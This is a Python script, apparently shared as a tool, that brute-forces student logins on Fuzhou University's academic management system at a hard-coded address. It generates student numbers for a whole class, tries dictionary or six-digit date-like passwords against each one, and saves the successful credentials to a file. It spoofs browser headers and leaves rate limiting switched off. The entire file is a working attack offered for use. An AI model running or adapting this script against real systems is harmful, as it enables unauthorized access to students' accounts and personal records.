#! /usr/bin/env python3
# -*- coding:utf-8 -*-

import os, re, random
from urllib import request, parse

def GetImformation(t):
	muser = []
	
	if t == 1:
		muser.append(input('Input the person`s Student Number?'))
	elif t == 2:
		college = format(int(input('Input the college code: ')), '02d')
		grade = format(int(input('Input the grade code: ')), '02d')
		major = format(int(input('Input the major code: ')), '02d')
		cla = input('Input the class: ')
		num = int(input('Input the class` numbers: '))
		for x in range(num):
			muser.append(college + grade + major + cla + format(x+1, '02d'))

	return muser

def Blasting(muser, dictionary):
	url = 'http://59.77.226.32/logincheck.asp'
	head = {
		'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
		'Referer': 'http://jwch.fzu.edu.cn/',
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	req = request.Request(url, headers = head)
	data = {'muser': '', 'passwd': '', 'x': '0', 'y': '0'}
	re_pass = re.compile('福州大学教务处本科教学管理系统')

	path = os.path.abspath('.')
	f = open(path + '/result.txt', 'a')

	if dictionary != '':
		p = open(dictionary)
		for user in muser:
			data['muser'] = user
			
			for x in p.readlines():
				data['passwd'] = x
				#time.sleep(1) #Invalid method
				response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
				if re_pass.search(response.read().decode('utf-8')):
					f.write('muser: %s\tpasswd: %s\n' % (data['muser'], data['passwd']))
					f.flush()

	else:
		passwd = []
		for x in range(32):
			for y in range(10000):
				passwd.append(format(x, '02d') + format(y, '04d'))
		random.shuffle(passwd)

		for user in muser:
			data['muser'] = user

			for pw in passwd:
				data['passwd'] = pw
				#time.sleep(1) #Invalid method
				response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
				if re_pass.search(response.read().decode('utf-8')):
					f.write('muser: %s\tpasswd: %s\n' % (data['muser'], data['passwd']))
					f.flush()

	f.close()


if __name__ == '__main__':

	t = int(input('1:Blasting for person.\n2:Blasting for a class.\nEnter your choice:'))

	muser = GetImformation(t)
	dictionary = input('if you have a dictionary, please enter its abspath:(or prass enter)')

	Blasting(muser, dictionary)
